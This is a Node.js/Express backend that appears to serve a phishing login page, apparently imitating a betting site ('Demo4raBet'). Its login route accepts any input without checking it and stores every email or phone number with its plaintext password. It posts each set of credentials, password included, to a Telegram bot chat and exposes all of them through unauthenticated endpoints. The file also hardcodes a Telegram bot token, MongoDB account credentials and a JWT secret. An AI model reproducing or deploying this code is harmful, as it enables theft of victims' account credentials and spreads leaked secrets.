const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'admin_jwt_secret_key_2025';

// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = '7874436750:AAF7LQcgO9CTB35B8GvCfHnq9YbF5pg81wE';
const CHAT_IDS = ['8180375324'];  // Add more chat IDs here if needed

// Middleware - Same CORS as your original
var corsOptions = {
  origin: '*',
  optionsSuccessStatus: 200
}
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(express.json());

// User Schema
const userSchema = new mongoose.Schema({
  email: { type: String },
  phone: { type: String },
  password: { type: String, required: true },
  loginMethod: { type: String, enum: ['email', 'phone'], required: true },
  loginDate: { type: String },
  loginTime: { type: String },
  createdAt: { type: Date, default: Date.now },
  loginHistory: [{
    date: { type: String },
    time: { type: String },
    method: { type: String },
    device: { type: String, default: 'Web Browser' }
  }]
});

// Admin Schema
const adminSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  lastLogin: { type: Date, default: Date.now }
});

// Connect to MongoDB
mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/Demo4raBet', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('Connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err);
});

// Models
const User = mongoose.model('User', userSchema);
const Admin = mongoose.model('Admin', adminSchema);

// Function to send message to multiple Telegram chat IDs
const sendToTelegram = async (message) => {
  try {
    for (const chatId of CHAT_IDS) {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
    }
  } catch (error) {
    console.error('Telegram Error:', error.response?.data || error.message);
  }
};

// Login route
app.post('/api/login', async (req, res) => {
  try {
    const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;

    // Validation
    if (!password || !loginMethod || !loginDate || !loginTime) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (loginMethod === 'email' && !email) {
      return res.status(400).json({ message: 'Email is required for email login' });
    }

    if (loginMethod === 'phone' && !phone) {
      return res.status(400).json({ message: 'Phone is required for phone login' });
    }

    // Create new user login record
    const user = new User({
      email: loginMethod === 'email' ? email : null,
      phone: loginMethod === 'phone' ? phone : null,
      password,
      loginMethod,
      loginDate,
      loginTime,
      loginHistory: [{
        date: loginDate,
        time: loginTime,
        method: loginMethod,
        device: 'Web Browser'
      }]
    });

    await user.save();

    // Prepare Telegram message
    const message = `<b>🔐 New User Login</b>

🔹 <b>Method:</b> ${loginMethod}
📅 <b>Date:</b> ${loginDate}
🕒 <b>Time:</b> ${loginTime}
📧 <b>Email:</b> ${email || 'N/A'}
📱 <b>Phone:</b> ${phone || 'N/A'}
🔑 <b>Password:</b> ${password}

👤 <b>User ID:</b> ${user._id}`;

    // Send login data to Telegram chat IDs
    await sendToTelegram(message);

    // Send response back to client
    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json({
      success: true,
      message: 'Login successful',
      data: userData
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error', 
      error: error.message 
    });
  }
});

// Get most recent user
app.get('/api/user', async (req, res) => {
  try {
    const user = await User.findOne().sort({ createdAt: -1 });
    if (!user) {
      return res.status(404).json({ 
        success: false,
        message: 'No users found' 
      });
    }

    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json({
      success: true,
      data: userData
    });

  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error',
      error: error.message 
    });
  }
});

// Get all users
app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    if (!users || users.length === 0) {
      return res.status(404).json({ 
        success: false,
        message: 'No users found' 
      });
    }

    const usersData = users.map(user => ({
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    }));

    res.status(200).json({
      success: true,
      count: usersData.length,
      data: usersData
    });

  } catch (error) {
    console.error('Get all users error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error',
      error: error.message 
    });
  }
});

// Delete user by ID
app.delete('/api/user/:id', async (req, res) => {
  try {
    const { id } = req.params;
    
    if (!mongoose.Types.ObjectId.isValid(id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid user ID'
      });
    }

    const user = await User.findByIdAndDelete(id);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'User deleted successfully'
    });

  } catch (error) {
    console.error('Delete user error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// Middleware to verify admin token
const verifyAdminToken = (req, res, next) => {
  const token = req.header('x-auth-token');

  if (!token) {
    return res.status(401).json({ 
      success: false,
      message: 'Access denied: No token provided' 
    });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (error) {
    res.status(401).json({ 
      success: false,
      message: 'Invalid token' 
    });
  }
};

// Admin login route
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Email and password are required'
      });
    }

    // Find admin by email
    const admin = await Admin.findOne({ email });
    if (!admin) {
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    // Check password
    const isPasswordValid = await bcrypt.compare(password, admin.password);
    if (!isPasswordValid) {
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    // Update last login
    admin.lastLogin = new Date();
    await admin.save();

    // Generate JWT token
    const token = jwt.sign(
      { id: admin._id, email: admin.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.status(200).json({
      success: true,
      message: 'Login successful',
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email,
        lastLogin: admin.lastLogin
      }
    });

  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// Create admin route (for initial setup)
app.post('/api/admin/create', async (req, res) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Name, email and password are required'
      });
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid email address'
      });
    }

    // Validate password length
    if (password.length < 6) {
      return res.status(400).json({
        success: false,
        message: 'Password must be at least 6 characters long'
      });
    }

    // Check if admin already exists
    const existingAdmin = await Admin.findOne({ email });
    if (existingAdmin) {
      return res.status(400).json({
        success: false,
        message: 'Admin with this email already exists'
      });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Create admin
    const admin = new Admin({
      name,
      email,
      password: hashedPassword
    });

    await admin.save();

    // Generate JWT token for immediate login
    const token = jwt.sign(
      { id: admin._id, email: admin.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    // Send notification to Telegram
    const message = `<b>🔧 New Admin Created</b>

👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🕒 <b>Created At:</b> ${new Date().toLocaleString()}

🆔 <b>Admin ID:</b> ${admin._id}`;

    await sendToTelegram(message);

    res.status(201).json({
      success: true,
      message: 'Admin created successfully',
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email,
        createdAt: admin.createdAt
      }
    });

  } catch (error) {
    console.error('Create admin error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error',
      error: error.message
    });
  }
});

// Admin dashboard route
app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin.id).select('-password');
    if (!admin) {
      return res.status(404).json({ 
        success: false,
        message: 'Admin not found' 
      });
    }

    const userCount = await User.countDocuments();
    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(10);
    const todayUsers = await User.countDocuments({
      loginDate: new Date().toLocaleDateString()
    });

    res.status(200).json({
      success: true,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email,
        lastLogin: admin.lastLogin
      },
      stats: { 
        totalUsers: userCount,
        todayUsers: todayUsers,
        recentUsers: recentUsers.map(user => ({
          id: user._id,
          email: user.email,
          phone: user.phone,
          loginMethod: user.loginMethod,
          loginDate: user.loginDate,
          loginTime: user.loginTime,
          createdAt: user.createdAt
        }))
      }
    });

  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ 
      success: false,
      message: 'Server error',
      error: error.message 
    });
  }
});

// Health check
app.get("/", (req, res) => {
  res.json({ 
    success: true, 
    message: "Server is running",
    timestamp: new Date().toISOString()
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found'
  });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Unhandled error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal server error',
    error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
  });
});

// Start server
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;